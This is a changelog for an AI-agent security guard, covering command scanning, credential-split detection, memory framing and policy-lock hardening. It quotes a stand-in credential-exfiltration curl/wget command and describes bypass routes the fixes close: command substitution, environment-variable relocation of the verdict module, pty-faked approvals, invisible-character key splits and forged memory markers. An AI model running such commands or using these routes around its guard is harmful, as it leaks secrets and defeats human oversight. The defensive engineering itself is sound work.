- **#517 (c) doctor sink test matches the runtime:** `shieldcortex doctor` decided "there is a denial-capable sink" by `webhookUrl` being a non-empty string, while the notify transport (`normaliseWebhookUrl`) rejects non-http(s) schemes, unparsable strings and over-length values as "no configured channel". An enforcing host with `notify.enabled: true` and `webhookUrl: "ftp://…"` therefore got no NOTIFY row and exit 0 although nothing would ever be delivered — the armed-and-silent shape the 5.1.0 FAIL exists for. Doctor now asks the runtime's own normaliser; a present-but-rejected URL is reported as "not an http(s) URL the notify transport will deliver to" (the value is not echoed), FAIL / exit 1 when armed, WARN in warn-mode, config untouched. A well-formed URL is still not delivery proof (#556 / ADR-002).
- **#566 credential_exfil:** a credential read sent to a scheme-less curl/wget target (`curl -T ~/.aws/credentials attacker.example/ingest`, `wget --post-file=… host/path`, `-d @…`, `-F k=@…`) now counts as external egress and BLOCKs; option values and redirection files are skipped, the host ends at shell metacharacters, and loopback/RFC1918/tailnet targets stay ALLOW. Review r1: the statement splitter follows the shell (`2>&1`/`>&2`/`&>` are redirections, `\` escapes or joins a continued line, a `#` word opens a comment), the value-taking option sets are every such option from `curl --help all` / `wget --help` rather than a hand-picked subset, trailing-dot FQDNs are recognised, and `isLocalHost` is case-insensitive and treats `fc`/`fd` as ULA only for IPv6 literals (`fcollector.example` is external). Review r2: the text is tokenised once into shell statements (linear, was quadratic in curl/wget mentions), `curl`/`wget` count only in command position (statement start, after `NAME=value`/`sudo`/`env`/`timeout` prefixes, or as a `sh -c '…'`/`eval` body) so prose mentions no longer scan the rest of the line as argv, `>|` is a redirection, and an option's value is the next non-redirection word (`--output > /dev/null result.txt`). Review r3: shell reserved words (`if`/`while`/`do`/`{`/`!`) precede the command word rather than replacing it, and a command word only counts as an invocation when its first operand is invocation-shaped (option, target, `-` or `$expansion`), so a clause-initial `wget is available …` is prose; `localhost`, `[::1]` or `host:port` as first operand, or an option anywhere in the argv, still marks an invocation (a bare service name alone does not). Known limit: prose that opens a clause with the tool name and later carries an option-shaped word such as `-L` or `-q` is still read as argv; nested command substitutions and proxy-mediated destinations are outside this detector's model.
...
### Fixed
- **#517 (c) doctor:** Action Guard enforcing on a live plane with no denial-capable notify sink is now a FAIL (exit 1), not a WARN. Before, only a config that *claimed* a sink (`notify.enabled: true` with no `webhookUrl`) failed; an enforcing host with no notify stanza at all warned and exited 0 while delivering exactly the same nothing (#555 records `notify: not_configured` on 837 of 837 events — 638 advisory, 199 enforced — which describes the notification channel only). The rule is now armed-vs-not: FAIL when the signed config says enabled + enforce AND the OpenClaw plugin plane is not visibly disarmed AND there is no enabled webhook sink. The row reports only — it never disables the guard, never writes config and never advises `enforce: false`; the fix names `actionGuard.notify.webhookUrl` (`shieldcortex config --action-guard-notify-webhook <https-url>`). Warn-mode, disabled and plugin-off hosts stay WARN with the existing "do not add a webhook" guidance (the 5.0.6 leftover-Enforce regression stays fixed). A `webhookUrl` set with `notify.enabled` not true is reported as the switch being off, not the URL being unset. Sub-issues (a) matched-token visibility and (d) python HTTP writes remain open on #517; the Claude Code hook plane is not yet a separately observed plane for this row (#556).
- **#550 session lease:** (a) A shell command maps to the `security-config` lease scope only when its shape WRITES a protected file (`~/.shieldcortex/config.json`, `~/.claude/settings.json`, `~/.openclaw/openclaw.json`): a redirect onto it, a mutating verb given it as an operand (`tee`, `sed -i`, `perl -i`, `rm`, `mv`, `truncate`, `chmod`/`chown`, `touch`, `dd of=`, an editor), a copy-like verb with it as the destination (`cp`, `install`, `ln`, `rsync`, `scp`), or an interpreter/shell handed it anywhere on the surface (`python3 -c`, `node -e`, a heredoc into `python3 -`, `bash -c`, `python3 script.py <file>` — the mapper does not parse programs, so these fail closed). Before, the three path rows fired on the path anywhere in the command text, so a commit message, a heredoc string literal, a `grep` pattern or a `cat` took the lease. Statements are split quote- and heredoc-aware: a heredoc body is data belonging to the stage that opened it (`cat > /tmp/x <<'EOF'` … a line naming the file … `EOF` takes nothing; the statements after the terminator are still judged), and a `;`, `|` or `>` inside a quoted string is not a separator or a redirect. The mapper FAILS CLOSED: a command that names a protected file on its executable surface takes the lease unless its shape is a positively proven read or mention — the file inside a quoted string, a comment or a heredoc body; a redirect elsewhere; a verb known to only read its operands (`cat`, `jq`, `diff`, `grep`, `ls`, `stat`, `head`, `tail`, `wc`, checksums, `echo`, `printf`, `awk` and `sed` without an in-place flag and whose script does not name the file (`sed 'w <file>'`, `awk '{print > "<file>"}'` are writes), `uniq`/`xxd` with the file as input (as the second operand it is their output), `tar` create/list, `git` log/diff/show/status/blame/add/commit/push and other non-working-tree subcommands, `dd if=`); the source side of a copy. An unknown verb given the file (`curl -o`, `wget -O`, `patch`, `yq -i`, `awk -i inplace`, `npx json -I -f`, `git checkout --`/`git restore`) is a write until proven otherwise, and so is a file handed over through `xargs`, an assignment whose value is the file (`T=<file>; echo x > "$T"`), or a redirect target computed by substitution. A redirect glued to the word before it (`printf x>~/.openclaw/openclaw.json`) is a redirect; a redirect written inside a heredoc body is not, and neither is a `|` there (the body is never split into pipeline stages). A `$( … )` or backtick substitution executes wherever it appears — inside double quotes, and inside the body of an UNQUOTED heredoc — so its body is judged as statements of its own; single quotes and a quoted delimiter keep it literal. Quoting is one state machine shared by every lexer (statement, pipeline, token, comment, heredoc and substitution scanning), so the contexts hold as a class rather than as spellings: an apostrophe inside double quotes is text and the `$( … )` beside it still runs; a backslash inside single quotes is literal, so `'a\'` is closed; `\$` and `\\` inside double quotes are escapes; `$'…'` is a quote whose `\'` is an escaped apostrophe; an expanding heredoc body has no quoting at all (quotes are text, only `\$`, `` \` ``, `\\` and `\⏎` escape). A backslash-newline is a line continuation wherever the backslash is an escape (bare, double quotes, an expanding heredoc body), so `tee \⏎<file>` and `printf x > \⏎<file>` are one statement; inside `'…'` and `$'…'` it is text. Process substitution `<( … )` / `>( … )` executes its body where it is bare (inside quotes it is text), and inside backticks bash strips the backslash before `$`, `` ` `` and `\` before running the body, so `` `echo \$(tee <file>)` `` writes while `` `printf x \> <file>` `` does not. The heredoc delimiter is the whole word bash reads, and ANY quoting in it — `<<'EOF'`, `<<"EOF"`, `<<\EOF`, `<<E'O'F`, `<<$'EOF'`, `<<$"EOF"` — makes the body literal and terminates on the unquoted word (inside `"…"` only `\$`, `` \` ``, `\"`, `\\` are escapes, so `"E\OF"` ends on `E\OF`), so the statement after the terminator is judged rather than swallowed. A lone `-` is stdin, an operand (`xxd -r - <file>` writes its second); grep's `-o` is only-matching, not an output option. In-place flags are read with their quotes off and inside clusters (`sed "-i"`, `sed -ni`, `sed -Ei`, `-i.bak`, `--in-place[=suffix]`). An output option naming the file is a write whatever the verb (`git diff --output=<file>`, `curl -o`, `wget -O`). Statements are read through compound keywords (`if … then touch <file>; fi`), wrappers with option arguments (`sudo -u root tee`, `env -u VAR touch`, `nice -n 10 rm`, `timeout 5 tee`), a newline inside quotes (a multi-line `python3 -c` program is one statement), and a `<<` inside quotes, a comment or `$(( ))` opens no heredoc, so the lines after it are still judged. Reads (`cat`, `jq`, `diff`, `ls`, `sed -n`, `git log --`), backups (`cp <file> <file>.bak`, `cp <file> /tmp/…`, `tar`, `rsync <file> host:`) and mentions take no lease. Write/Edit tool calls are judged on their target path exactly as before. (b) NOT in this change — split out after review (#552): two enforcement planes gate one tool call under two identities when OpenClaw runs Claude Code as a child (the interceptor as the OpenClaw session id, then the PreToolUse hook as the hashed Claude session id), and the hook refuses a lease its own gateway holds. A pid-ancestry re-entry (parent/grandparent match plus a call key stamped on the record) was reviewed and withdrawn: one gateway process backs every session's record and a key derived from the command text is readable by any session, so parentage plus a stored nonce is not an attestation of identity. Strict identity matching stays on both planes; the self-refusal is tracked in #554, which needs a host-maintained binding of the specific child harness to the OpenClaw holder session (process-instance identity, refusing missing/forged/expired bindings, freeze first). The mapper fix above removes the mention/read false positives that made the refusal fire on ordinary reads. Disclosed costs: an interpreter or shell given the file as a read-only argument (`node cli.js doctor --config <file>`, `bash -c 'cat <file>'`, `perl -ne print <file>`) and an unknown read-only tool given the file take a lease they did not need — the fail-closed direction; a script that writes the file without naming it on the command line (`python3 patch.py`, `openclaw config set`, `find … -delete` on the directory) is invisible to the mapper as before.
- **#517 (b) Action Guard:** a file-reading command substitution — `$(cat f)`, `$(< f)`, `` `cat f` `` — is now expanded and scanned as a second surface, so the guard also scans the command the shell will actually execute. Before, every rule saw the pre-expansion string: `bash payload.sh` was folded and blocked while `bash -c "$(cat payload.sh)"` ran unscanned with no opaque signal, and a launcher prompt was denied when quoted literally yet allowed as `"$(cat prompt.md)"`. The typed command is still scanned exactly as before — the substitution's own read (`cat ~/.ssh/id_rsa`), the wrapper it runs behind (`sudo`), and every statement after it keep their verdicts — and the expanded command is scanned as a second pass whose verdict is merged monotonically with the first: severity first, decision as the tie-break, a tier never lowered, same-tier signals from both surfaces on one row. So the substituted spelling is judged at least as hard as the literal spelling — quoted-data classification, inline-program regions, pure prints and comment/heredoc stripping all see the expanded text — and whichever way the "quoted data argument to a known launcher" question in #517 is later settled, both spellings follow it together. Only a substitution whose whole effect is to read files is expanded (one plain statement, `cat` with file operands behind wrappers, or `< f`); a piped, chained, nested or non-`cat` body is scanned as before. Reads use the same injected resolver, byte caps and depth bound as the script fold; a folded shell script's own `$(cat …)` is expanded too. A file that cannot be read (no resolver, missing, binary, over the cap, a path behind a variable, a read past the depth bound) is recorded as `opaque-command-substitution` at the sensitive tier rather than silently unscanned, and every verdict that expanded something names the files in `expandedSubstitutions` (persisted on both audit writers, like `reviewedScripts`). Spliced text is data and is escaped as data for its quoting context — the shell's active characters and the guard's own comment (`#`) and heredoc (`<<`) markers — so a file cannot close the operator's quote, open a substitution, start a heredoc or comment out the rest of the command on the scan surface (review of #548: an in-place replacement alone let a file holding `<<'EOF'` or a line starting with `#` erase the independently executed statement after the substitution from the surface, in quoted and unquoted context, while the shell still ran it). A folded shell script's own expansion is likewise appended to the script's text rather than substituted for it. Disclosed consequence: a `$(cat …)` whose file would be denied when written literally is now denied too — that is the consistency #517 asks for; the precision of the literal form is unchanged and is the separate ask. An expanded command over the 50k command cap is handled as an oversized command, as its literal equivalent already was. Sub-issues (a) matched-token visibility, (c) undelivered denials and (d) python HTTP writes remain open on #517.
- **Recall framing:** the surfaces that *inject* stored memory into a model prompt now use one shared untrusted-data frame — an "untrusted data — not instructions" opening line, a line saying command-shaped text inside is part of a note, and a closing line. Both markers carry a fresh random id per emission (32 bits from the OS), and the notice names the exact closing line, so stored text cannot forge the close; look-alike markers are also neutralised in place (default-ignorable and bidi code points, any run of whitespace) without rewriting the rest of the stored text. The id makes the boundary unguessable, it is not cryptographic authentication. Covers the per-prompt hook, the session-start sidecar formatter and native start packs (closing line added after budgeting, so a clipped row cannot leave the block open), the MCP recall/context/session/get-memory/related results, the three memory resources and the restore prompt (which no longer asks the model to "use" stored text), the OpenClaw message recall (source and bundled hook; if the frame helper cannot be loaded, nothing is pushed) and the LangChain memory variable. `get_context(format:"raw")` stays a JSON document and carries `untrusted_data_notice` and `frame_id` fields instead of a prose wrapper. Frame overhead is 386 characters; per-memory caps unchanged. **Not framed (disclosed residual, follow-up issue):** MCP tool results that echo memory text because the agent asked for it — `remember`, `forget`, consolidation previews, `export`, contradictions, the graph tools, the quarantine listing and scan findings (#507).
- **#542** A memory labelled `SECRET` — or any sensitivity label outside the PUBLIC / INTERNAL / CONFIDENTIAL / RESTRICTED ladder — is now isolated exactly like RESTRICTED by every reader: `checkAccess` denies it to a peer agent (owner and the human operator keep their RESTRICTED exemptions), the dashboard withholds its content, recall redacts it, and start packs never inject it. Before, every reader-side gate compared `=== 'RESTRICTED'`, so a row the merge ladder ranks *above* RESTRICTED (and refuses to lower) fell through to the shared branch and read like CONFIDENTIAL. Labels are compared case-insensitively; an absent label still means INTERNAL. The `doctor` admitted/injectable counts use the same rule, with the same normalisation: the SQL predicate strips exactly the whitespace `String.trim` strips (SQLite's bare `TRIM` strips spaces only, so a tab- or newline-padded `INTERNAL` was injectable but counted as not), case folding is ASCII-only on every side (`ınternal` stays an unknown label), and the inject pack treats a non-string label such as `0` as a label rather than as absent. A differential test runs every label through SQLite, the TypeScript helper and the inject pack. Whether `SECRET` becomes a real tier or is normalised at write is still open on #542; this change holds under either answer.
...
- **#543 (refs)** A provider key split by separators is detected, blocked and redacted when the split is one the scanner can tell from formatting; on 5.0.7 every split variant produced zero findings. The scanner runs the provider patterns a second time over a separator-collapsed view that remembers where each character came from, and acts on the ORIGINAL span: the finding's `position` is the key's first character and the redaction covers the key and the inserted separators. Such findings carry `evasion: 'separator_split'`. Separators are in two classes. VISIBLE: every Unicode whitespace (space, tab, newline, CRLF, NBSP). INVISIBLE: the soft hyphen, zero-width space / non-joiner / joiner, word joiner, BOM and the bidi controls (LRM/RLM, the embedding/override/isolate controls). Visible punctuation (`sk-abc.def`, `AKIA,ABCD,…`) is not a separator. Patterns that consult whitespace themselves (`KEY=…` assignments, `Authorization: Bearer …`, private-key blocks, connection strings) are not run on the collapsed view. What the collapsed pass claims: (1) A hit split by an INVISIBLE separator (alone or mixed with whitespace) is a key whenever the value holds a letter and a digit and passes the pattern's own facts — no prose test is applied, because a reader cannot see that the value was split. This is a formatting-risk rule, not a finding of intent: soft hyphens and bidi marks also arrive in ordinary pasted text (see the residuals). This covers every provider pattern, the AWS access key id included, and holds when the id is quoted, bold, in JSON, or has a letter glued onto either end. (2) A hit of an open-ended or mixed-case pattern (`sk-…`, `ghp_…`, `AIza…`, `xoxb-…`, the fixed-length hex keys) split by visible WHITESPACE is a key unless it is structurally prose: every fragment between separators is a word (three or more letters, one case or Capitalised, no letter pair English does not use; or a two-letter function word) or a period token (`2026`, `Q1`, `FY26`, `1st`), at least one word of three or more letters sits beyond the pattern's literal prefix, and words make up half the hit or more — one fragment that is neither (`4K2M`, a lone letter, mixed case) makes the hit a key, so the decision cannot be diluted by filler. A boundary fragment is judged on the alphanumeric run around the boundary, so quoting or bracketing the text changes nothing. (3) A hit of the AWS access key id (`A[KS]IA` + 16 capitals or digits: fixed length, one case, every letter admitted) split by visible whitespace ALONE is not claimed. This is a stated gap, not a residual: that pattern cuts a 20-character window out of any shouted heading, and every rule tried for the window across four review rounds was either evaded by an attacker choosing the split points (94% with whitespace, 100% with one glued letter) or blocked ordinary headings (`ASIA Q1 GDP GROWTH FORECAST`, `ASIA B2B SALES FORECAST`) as critical; a rule with both properties buys nothing. The direct pass on a contiguous AWS id is unchanged, and the collapsed pass still applies the base-32 fact (`collapsedValuePattern`, `[A-Z2-7]` body) to an invisible-split id. Where the direct pass already matched a value starting at the same character, the collapsed pass leaves it alone and resumes after it (`sk-… customer123` redacts the key only). A word before or after a key is trimmed off the span at the innermost word, one- and two-letter fragments inward of it are the key's own tail and stay, and a trim is accepted only when the pattern still matches what is left, so trimming never removes a finding. Candidates are discovered from every pattern first and then resolved: a candidate that contains another pattern's candidate is cut at that start when the cut span still validates (`sk_test_… AIza…` is a Stripe key and a Google key, both reported), and a candidate is only ever dropped when an already accepted range of equal or higher severity covers it whole — a lower-severity finding never hides a higher one.
  - Measured (`scripts/lab/credential-split-evasion.mts`, 20,000 random synthetic ids per class, seeded). Strict rule, attacker-optimal whitespace split — exact search over every partition plus a letter glued onto either end, each predicted evasion re-run through the scanner: 0 of 19,995 `sk-` and 0 of 19,966 `AIza` bodies dismissed; every naive split of those found. AWS id split by an invisible separator — after every 1, 2, 3, 4 or 8 characters, once with a BOM, with soft hyphens, mixed with spaces, inside quotes, or with a letter glued onto both ends: 100% of 19,312 ids that hold a digit found. AWS id split by visible whitespace alone: 0%, by policy. Precision, in the #543 test: 6,000 generated headings (all-caps, Title and lower case; ~150 report words, abbreviations, years and period tokens behind `ASIA`/`AKIA`) bare and wrapped thirteen ways (78,000 texts), 3,000 generated digit-abbreviation headings (`B2B`, `3PL`, `2FA`, `K12`, `W2`, `401K`, `4G`, `Q1`–`Q4`, `FY26`, `H1`/`H2` and more) bare, wrapped (39,000) and with an invisible character at either edge (18,000): zero findings. Cost: the exact-span check looks back at most 256 characters and trimming is bounded, so a split key followed by 16,000 words scans in about 20 ms (was 1.3 s); resolution bisects candidates sorted by start with a per-severity prefix-maximum coverage index and the redaction is built in one pass, and the git-SHA/UUID allowlist check stops expanding a token past 64 characters, so 1k / 2k / 4k / 8k split ids joined by ` | ` scan in 15 / 22 / 51 / 86 ms (was 23 / 120 / 393 / 2404) and 800 / 1600 / 3200 space-joined split ids in 18 / 33 / 33 ms (was 415 / 1704 / 6551).
  - Residuals: a key with no digit at all is not matched by the collapsed pass (about 4% of AWS access key ids; negligible for mixed-case bodies). A key split after a head long enough to match on its own is reported as an ordinary contiguous finding (no `evasion` flag) and only the head is redacted. A 1–2 letter fragment directly after a finely split key cannot be told from the key's tail and is included in the span (over-redaction only). A collapsed hit that could not be cut at an inner token start stays whole, so the inner key is reported twice rather than hidden. A fixed-length pattern with a trailing lookahead (Mailgun `key-…`, the 32-hex Azure rule) still needs a non-alphanumeric character after the value once the separators are gone. An AWS id written with a 0, 1, 8 or 9 (a documentation sample, not an issued id) is caught contiguous but not split. A heading that holds an invisible character inside the AWS window (for example a soft hyphen inside one of its words, as pasted text can carry) is claimed as a key: a known false positive of the invisible class, accepted rather than intended.
...
- #510: PII identifiers are redacted on memory write, not just flagged at audit time. UK NI numbers, US SSNs, labelled tax ids (UTR/EIN/TIN) and salary figures become `[REDACTED:<kind>]` in the stored title, content, FTS index and sync payload; email/phone go too when the same memory holds an identifier (a bare vendor contact stays readable). Such content is classified at least CONFIDENTIAL with `pii:*` labels. PII never blocks a write. `SHIELDCORTEX_PII_REDACTION=off` stores verbatim but keeps the labels. Tags and metadata are redacted too: a metadata key that names an identifier (`utr`, `ssn`, `ni`, `tax_id`, `salary`, `pay`, …) redacts its value whatever its type, `Date`/`Buffer`/`Map`/`Set` values keep their type, and a metadata subtree past the scan bounds (depth 8 / 5,000 containers) is replaced with `"[REDACTED:unscanned]"` rather than stored unscanned — the row becomes CONFIDENTIAL. The write-audit `content_hash` of a PII-bearing record is taken over the redacted text (no guessing oracle); every other audit hash is byte-identical to before. Under an identifier key a string holding any digit is replaced whole (a redaction token already in the value exempts nothing), binary values are replaced too, and the key's kind is not inherited into descriptor children (`year`, `date`, `period`, `frequency`, `currency`, `band`, `grade`, `type`, `id`, `note(s)`, `source`, `updated`, `created`) — `{salary:{amount, year, currency}}` loses only `amount`. Redacted rows are never merge/consolidation candidates. On the hook write path a redacted candidate is a duplicate only when the project already holds a row with the identical redacted title and content created in the last 24 hours, or already holds 3 such rows of any age: a re-extraction loop stores one row, and two people's records captured more than 24 hours apart are both kept. Legacy migration keeps a row's embedding unless its title or content changed. An identifier held only in tags or metadata counts for the audit hash too, and an identifier redacted by an earlier write still marks the record, so a contact detail added by a later partial update is redacted beside it. A merge keeps the highest sensitivity either row held — redaction only raises a row to CONFIDENTIAL and never lowers a RESTRICTED one. Hook-written `session_events` (prompt-recall, session-end, pre-compact; single and batch) and memory-file scan findings queued into `quarantine` go through the same redactor; a previously reviewed quarantine row stored raw re-queues once.
  - Residuals, accepted: two distinct records that redact identically and are captured within 24 hours of each other collapse to one, and at most 3 identical redacted rows are kept per project. Metadata is scanned to depth 8 and 5,000 containers per field (scalars cost nothing, so a 10,000-number embedding survives); a large or deep legitimate tool payload loses the subtree past the bound to `[REDACTED:unscanned]` and its row is raised to CONFIDENTIAL. `Map`/`Set` values in metadata keep their runtime type but still serialise to `{}` in JSON, exactly as before this change. Pre-existing and out of scope here: the OpenClaw realtime plugin's JSONL audit hashes raw conversation text.
  - Residuals, by design: (1) an unlabelled lowercase `ab123456c`, unlabelled `AB123456a` and unlabelled undashed `078051120` are NOT redacted — without a label they are indistinguishable from hex digests and ids; all three ARE redacted when labelled (NI / SSN context). (2) The hook write paths (memories and `session_events`) load the redactor from `dist`; if the redactor alone is missing or stale — or throws — the memory or event is still stored — UNREDACTED, at CONFIDENTIAL or above (an existing RESTRICTED or SECRET label is kept as written, never lowered), with a stderr notice — once per hook process for `session_events`, once per candidate for memories — because dropping memories is worse. This is a fail-safe, not a fail-closed redaction guarantee. It covers a missing redactor only: if any REQUIRED defence module in `dist` (the pipeline, database init or disposition) is missing — not only when all of them are — hook memory capture is dropped (audited as `defence_pipeline_unavailable`) exactly as before this change, while `session_events` are still written. Run `shieldcortex doctor` after an upgrade so `dist` is fresh. (3) Names and postal addresses are not detected. (4) Metadata nested deeper than 8 levels is replaced by the `unscanned` token even when it held no PII.
...
- **#501 Action Guard signals for the lock's own attack surface.** Setting `SHIELDCORTEX_DIST_ROOT` or `SHIELDCORTEX_PROTECTED_ROOT`, writing/editing/deleting anything under `/etc/shieldcortex` (or its `/etc/shieldcortex.conf` pointer), and writing/editing `~/.claude/settings.json` — whose `env` stanza is how those variables reach an enforcing process — now carry the `disable-action-guard` signal, on the live classifier and on both outage fallback tables. Naming one of those paths in prose or inside a URL is still not access, as with every other path rule.
...
- **#522** `shieldcortex protect` verifies the destination directory chain for the agent uid BEFORE creating, chmodding, writing or renaming anything, and refuses without touching the disk when that chain would not verify — from the deepest existing ancestor up to `/`, under the same rules the runtime reader applies. It previously wrote first and verified after, so a privileged run pointed at an agent-owned or agent-writable chain created directories and a lock file there, on the agent's terms, and only then reported that the result would not verify. `--dry-run` now also says whether the real write would be refused.
- **#522** `shieldcortex protect` without `--from-config` no longer reads `config.json` at all. It pins the safe posture — guard on and enforcing, empty `autoApprove` and `reviewedScripts` ceilings, broker off, `defenceMode` floor `balanced`, no memory pin — instead of carrying the same-UID config's `autoApprove`, broker switch, `defenceMode` and memory values into the root-owned lock, where a value the agent uid had seeded became one that uid could no longer be blamed for. `--from-config` still pins the config verbatim, including an Action Guard that is OFF, and is now the only path that opens the file. Named residual, unchanged: a verified lock's *permitted* reviewed entry still skips that file's body ahead of the catastrophic scan — #189's design, now bounded by a root-owned ceiling rather than by the same-UID config alone.
- **#522** `shieldcortex protect` now resolves the uid the lock is FOR — `--agent-uid <uid>`, else `SUDO_UID` — and refuses, before resolving or writing anything, when a privileged run has neither (a system service, or an already-privileged shell). It previously judged the destination as `nobody` (65534) in that state, so an agent-owned `0755` directory read as "owned by another uid": the lock was written there, reported protected, and the directory's owner could replace it. `--dry-run` had the same false identity and reported such a destination as verifying. An unprivileged `--dry-run` is judged as its own uid, and every run prints which uid it judged as and where that came from; a uid of 0 from any source is refused.
- **#522** `shieldcortex protect --from-config` refuses, writing nothing, when the source config is missing, unparseable or not a JSON object. It previously carried on with an empty config — which maps to an Action Guard that is OFF — and printed "pinning defaults" while freezing the guard off in a root-owned file. The safe posture is the flag-less run; an explicit request for values that do not exist is an error.
- **#522** When `shieldcortex protect` is itself unprivileged (the common `--dry-run` case), it now judges the destination as its own uid rather than a `SUDO_UID` left over from an unrelated context — an env var inherited from a targeted launch or a stale earlier elevation names whoever launched some other run, not necessarily this one, and this process can always answer for its own identity directly. `SUDO_UID` is now consulted only while this process's own identity is itself elevated, the one state in which it cannot answer for itself.
- **#522** `shieldcortex protect --from-config` no longer follows a symlink at the source config path, and a parse failure no longer echoes the underlying parser message. The source path is under the same account whose config it is, so a plain unconditional read let that account point it at any other file this elevated process can read, and a `JSON.parse` failure on the result quotes back (up to 10 characters of) whatever it read — together, a route for a same-UID symlink to make an elevated `protect` run leak a fragment of an arbitrary file it can read to the operator's terminal. The source is now required to be a plain, non-symlink file, checked by `lstat` before it is ever opened, and refusal text never repeats what the parser said.
- **#501** On a host with a policy lock on disk, the Claude Code PreToolUse hook no longer honours `SHIELDCORTEX_DIST_ROOT` for **any** `dist` module — every loader in `scripts/pre-tool-hook.mjs` now resolves through one gate, so the build shipped beside the script is the only one that decides. Previously the variable could relocate the module that returns the allow/deny verdict itself: one file in a directory the agent already owns, and the lock was read correctly, the strict fail-closed posture computed, and then handed to a classifier that answered `allow` for everything. The variable is unchanged on unlocked hosts, where it remains the test seam it has always been. Note the bound: this closes the environment route, not a substituted install — a `dist` whose contents an attacker chose is #500's boundary (design note §8.6).
- **#501** A `tampered` integrity verdict now forces the whole fail-closed posture (Action Guard on + enforcing, empty auto-approve, broker off, `defenceMode: 'strict'`), from the same constant the policy lock uses. It previously set `defenceMode` and nothing else, so `actionGuard.enabled` was still read straight out of the bytes the integrity check had just called untrustworthy — the one scenario the check exists to catch was also the scenario in which the guard stayed off.
- **#501** The Claude Code PreToolUse hook now honours `SHIELDCORTEX_CONFIG_DIR`, like every other reader. It hard-coded `~/.shieldcortex`, so on any box using the override it was enforcing against a different config from the rest of the product.
- **#501** `shieldcortex doctor` reports the ENFORCED Action Guard posture rather than the posture `config.json` asks for. Its posture row parsed the file directly, so on a box where the policy lock had the guard on and enforcing it still printed “Action Guard is disabled in config”.
- **#501** `hasTrustedMemorySidecarPosture` — the one place a signature has ever gated a security decision — now requires the policy lock to declare the sidecar posture when a lock exists, falling back to `_sig` only on unlocked hosts.
- **#502** `shieldcortex approve` (and `deny`) no longer treats a pseudo-terminal as proof of a human. `script -qec`, `expect`, `python pty.spawn`, detach-after-pty (inherited fds, no controlling terminal), an interpreter as the session leader, a leader outside the parent chain, and an agent above the recovered leader are all refused. Both grant paths require a TTY, a controlling terminal, no agent-host environment marker, no agent in the leaf ancestry or the session leader's ancestry, and a leader that is not a pty tool or interpreter. Listing still needs no TTY. Unknown terminals and WSL/console login (bash whose parent is init) are allowed. Documented residuals a same-UID process-tree check cannot close without carding WSL users: daemonise+openpty+exec-bash, agent-started tmux/screen/sshd, `ssh localhost` with keys, user-namespace fake `/proc`, comm forgery, a pty tool two hops above the leader. The OS-owned lock (#501) is the next bar. Guard stays off by default.
- **#500** Action Guard now gates tool-call mutations to itself: `shieldcortex config --action-guard-disable` / `--action-guard-advisory`, `iron-dome deactivate`, global uninstall of the package, and Write/Edit of `~/.shieldcortex/config.json`. Same-UID writes outside the tool surface remain the OS policy lock (#501). Guard stays off by default. Outage fallback (#59) covers the same signals so a down scanner cannot fail-open a disable, global uninstall, or config.json write.
- **#444** Action Guard no longer hard-denies `python3 repair.py` because the script's Python docstring or comment quotes a global install in Markdown backticks. Relief applies only to scripts folded from disk: disk bytes are never expanded by the invoking shell, and Python 3 has no backtick execution. Text that lives in the command itself (inline `-c` programs, heredocs, write-then-run bodies) keeps the any-backtick sink as before. Ruby / Perl / PHP / Node keep it everywhere. Real `os.system` / `subprocess` / `__import__('os').system` installs still gate. Guard stays off by default.
...
- `allowlist scan` no longer treats a leftover empty `~/.openclaw` (no `openclaw.json`) as an OpenClaw install. That used to exit 1 with “OpenClaw is installed but neither cron source exists” on Hermes-only boxes. A real `openclaw.json` with both cron stores missing still fails closed (#375).
...
### Changed
- **`GET /api/graph/entities/:id/neighbourhood` now caps ALL neighbours, not just the `related_to` fill-in.** Previously only weak (`related_to`) neighbours were capped at 25 and every meaningful neighbour was returned; now every neighbour counts against one budget — `?limit=` (default **50**, clamped to `[1, 150]`), meaningful predicates first, then `related_to`, each class ordered by neighbour `memory_count DESC, id ASC`. `counts.totalNeighbours` / `counts.omittedNeighbours` report what was cut. Callers that relied on the unbounded meaningful set should pass `limit` (up to 150) or use `depth`/paging. With `?project=`, the focal entity itself must be in scope (otherwise `404`).
- **`GET /api/graph/entities/:id/triples` is now bounded**: `?limit=` (default 200, clamped `[1, 1000]`), deterministic `ORDER BY created_at DESC, id DESC`, plus additive `total` / `limit` / `hasMore` fields. Previously unbounded.
- **`GET /api/graph/paths` is bounded and scoped**: BFS stops at depth 4, 2000 visited entities or 500 edges per node and reports `truncated: true` on any of those bounds (so an empty `path` with `truncated` means "not found within budget", not "no path exists"); `?project=` scopes both endpoints, every hop and `sourceMemories`; each hop gains `entityType`, `memoryCount`, `confidence`, `disputed`.
- **Optional `?project=` on `GET /api/graph/triples` and `GET /api/graph/entities/:id/triples`** (both endpoints of a triple must be in scope). Unchanged when omitted.
- **Stricter parsing on every graph route**: an entity id that is not a positive integer (`12junk`, `0`, `-1`, `1.5`) is `400` — including `fromId`/`toId` on `/api/graph/paths`, which previously answered `404` for garbage; a `project` supplied as anything but one string (e.g. `project=a&project=b`) is `400` rather than silently dropping the filter.
...
Patch on 5.0.0. Action Guard stays off by default. Node floor unchanged (`^22.14.0 || >=24.0.0`).
...
### Changed
- **Express 4 → 5 (#466).** The direct `express` dependency moves from `^4.21.0` to `^5.2.1`. Express 4.22.2 — the last 4.x — pins `qs: ~6.15.1` itself, and the fix for GHSA-4mjr-xmp4-gh2g / GHSA-x5fp-wj9c-mxmx only landed in qs 6.16.0, a version that range can never reach, so no 4.x fix exists. **Three behaviour changes come with the major**, each pinned by a test:
  - **Route patterns.** path-to-regexp v8 throws at registration on the bare `*` the API catch-all used, so `app.all('/api/*')` becomes `app.all('/api/{*splat}')`. That is the only spelling with express 4's match set, measured against a real router: `'/api/*splat'` misses `/api/`, and `'/api{/*splat}'` swallows `/api`, which must keep falling through to the dashboard shell. No other route in the app uses a wildcard.
  - **Query parser default,** `extended` → `simple`. Accepted rather than reverted: nothing in the repo or the dashboard reads a nested query structure (no bracket or dotted keys anywhere, and every `req.query.x.y` in the tree is a string method on a value already guarded as a string), so `qs` leaves the query path entirely. **This is a wire-level difference for any external client sending nested bracket syntax** — none is documented, and it is reversible with `app.set('query parser', 'extended')`.
